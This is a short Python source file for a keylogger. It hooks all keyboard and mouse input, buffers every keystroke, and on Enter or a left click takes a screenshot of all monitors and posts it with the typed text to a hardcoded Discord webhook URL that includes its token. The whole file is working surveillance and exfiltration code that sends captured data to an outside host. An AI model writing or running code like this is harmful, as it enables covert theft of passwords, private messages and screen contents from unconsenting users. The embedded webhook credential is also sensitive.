import keyboard, mouse ,requests
import io
import datetime as dt
import mss
import mss.tools


buffer = []
WEBHOOK_URL = "https://discord.com/api/webhooks/1406494823116177458/3rAo1RQPEmLzDyN1xLgGOOheACxaFQ1B0nr650sEtswgSS2iBrZzO4oJxCNj4i8msMVC"

def send_to_discord(text) -> None:
    # 1) Capture full virtual screen (all monitors combined)
    timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    content = f"Message: {text}\nTime: {timestamp}"

    with mss.mss() as sct:
        img = sct.grab(sct.monitors[0])

        # 2) Encode PNG into memory (no file saved)
        png_bytes = mss.tools.to_png(img.rgb, img.size)
        buf = io.BytesIO(png_bytes)
        buf.seek(0)


    # 3) Post to Discord with text + in-memory image
    files = {
        "file": ("screenshot.png", buf, "image/png")
    }
    data = {
        "content": content
    }
    requests.post(WEBHOOK_URL, data=data, files=files, timeout=15)




def dump_and_clear():
    if buffer:
        txt="".join(buffer)
        print(txt)
        send_to_discord(txt)
        buffer.clear()

# ---------- keyboard ----------
def on_key(e):
    if e.event_type != "down":
        return
    if e.name == "esc":
        keyboard.unhook_all()
        mouse.unhook_all()
        raise SystemExit
    if e.name == "enter":
        dump_and_clear()
    elif len(e.name) == 1:
        buffer.append(e.name)
    else:
        buffer.append(f"<{e.name}>")

# ---------- mouse ----------
def on_mouse(e):
    # 1️⃣ Ignore movement and wheel events
    if not isinstance(e, mouse.ButtonEvent):
        return
    # 2️⃣ React only to right-button press (“down”)
    if e.event_type == "down" and e.button == "left":
        dump_and_clear()

keyboard.hook(on_key)
mouse.hook(on_mouse)

print("Listening globally… (Esc to quit)")
keyboard.wait()
